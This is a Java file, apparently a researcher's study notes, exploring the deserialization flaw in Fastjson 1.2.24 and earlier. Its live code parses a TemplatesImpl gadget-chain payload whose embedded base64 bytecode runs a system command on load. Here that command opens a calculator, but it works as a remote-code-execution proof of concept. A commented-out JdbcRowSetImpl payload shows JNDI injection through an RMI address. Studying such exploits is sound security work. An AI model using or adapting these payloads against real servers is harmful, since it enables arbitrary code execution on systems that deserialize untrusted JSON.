package Fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import javax.xml.transform.TransformerConfigurationException;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/4/24 16:36
 */
public class Fastjson1224 {
    public static void main(String[] args) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException, TransformerConfigurationException, NoSuchFieldException {
        //以下均针对Fastjson <= 1.2.24


        //Fastjson可以将String解析为类，这里解析为Person类，但是这也是安全的，因为我们指定了转化为什么类
//        String s = "{\"name\":\"L3ttuc3\",\"age\":\"23\"}";
//        Person person = JSON.parseObject(s, Person.class);
//        System.out.println(person.toString());


        //当字符串中有@type字段的时候，就会根据这个字段的不同解析为不同的类，客户端控制，这就很危险了
//        String s1 = "{\"@type\":\"Serialization.Fastjson.Person\",\"name\":\"L3ttuc3\",\"age\":\"23\"}";
//        String s1 = "{\"@type\":\"Serialization.Fastjson.EvalCode.Calc\",\"cmd\":\"L3ttuc3\"}";
//        String s1 = "{\"@type\":\"Serialization.Fastjson.EvalCode.Calc\",\"cmd\":\"L3ttuc3\"}";
//        JSONObject jsonObject = JSON.parseObject(s1);
//        System.out.println(jsonObject);

//        JSON.parseObject("{\"@type\":\"org.example.App$User\",\"id\":\"123\"}", Feature.SupportNonPublicField);








//        Person person = new Person("lucy",18);
//        String s = JSON.toJSONString(person, SerializerFeature.WriteClassName);
//        System.out.println(s);

//        String s = "{\"@type\":\"Serialization.Fastjson.Person\",\"age\":18,\"name\":\"lucy\"}";
//        Person parse = (Person) JSON.parse(s);
//        parse.getAge();


        /*
        从如下代码运行结果可以得到结论：
        在使用JSON.parseObject方法的时候只有在第二个参数指定是哪个类 才会反序列化成功
        在字符串中使用@type:com.liang.pojo.User指定类 会调用此类的get和set方法 但是会转化为JSONObject对象
        而使用JSON.parse方法 无法在第二个参数中指定某个反序列化的类，它识别的是@type后指定的类
        而且可以看到，凡是反序列化成功的都调用了set方法

        使用JSON.parse方法反序列化会调用此类的set方法
        使用JSON.parseObject方法反序列化会调用此类get和set方法
         */
//        String json = "{\"@type\":\"Serialization.Fastjson.Person\",\"age\":18,\"name\":\"lucy\"}";
//        String json2 = "{\"age\":13,\"name\":\"lihua\"}";
//        System.out.println(JSON.parseObject(json));
//        System.out.println("------------------");
//        System.out.println(JSON.parseObject(json,Person.class));
//        System.out.println("------------------");
//        System.out.println(JSON.parseObject(json2, Person.class));
//        System.out.println("------------------");
//        System.out.println(JSON.parseObject(json2));
//        System.out.println("------------------");
//        System.out.println(JSON.parse(json2));
//        System.out.println("------------------");
//        System.out.println(JSON.parse(json));


//        将恶意代码转化为字节码
//        byte[] buffer = null;
//        String filepath = "src/main/java/EvalCode/Calc.class";
//        try {
//            FileInputStream fis = new FileInputStream(filepath);
//            ByteArrayOutputStream bos = new ByteArrayOutputStream();
//            byte[] b = new byte[1024];
//            int n;
//            while((n = fis.read(b))!=-1) {
//                bos.write(b,0,n);
//            }
//            fis.close();
//            bos.close();
//            buffer = bos.toByteArray();
//        }catch(Exception e) {
//            e.printStackTrace();
//        }
//        Base64.Encoder encoder = Base64.getEncoder();
//        String value = encoder.encodeToString(buffer);
//        System.out.println(value);

        /*
        TemplatesImpl链子
        原理：JSON.parseObject的时候，会调用到TemplatesImpl.getOutputProperties()，从而调用到newTransformer()
        而调用到了newTransformer()，之后就和CC3的那部分一样了，都是同样的动态类加载
         */

//        这个payload有小坑，看网上资料是至少要有这几个字段：@type、_bytecodes、_name、_tfactory、outputProperties
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACQAKBwAhDAAiACMBABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABtTZXJpYWxpemF0aW9uL0Zhc3Rqc29uL0NhbGMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAABAAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABwADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAhAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABMACQAWAAwAFAANABUAEQAXABMAAAAHAAJMBwAUBAABABUAAAACABY=\n\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\"}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);


        /*
        JdbcRowSetImpl链子，成功弹出计算器
         */


//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
//        JSON.parse(payload);
    }
}





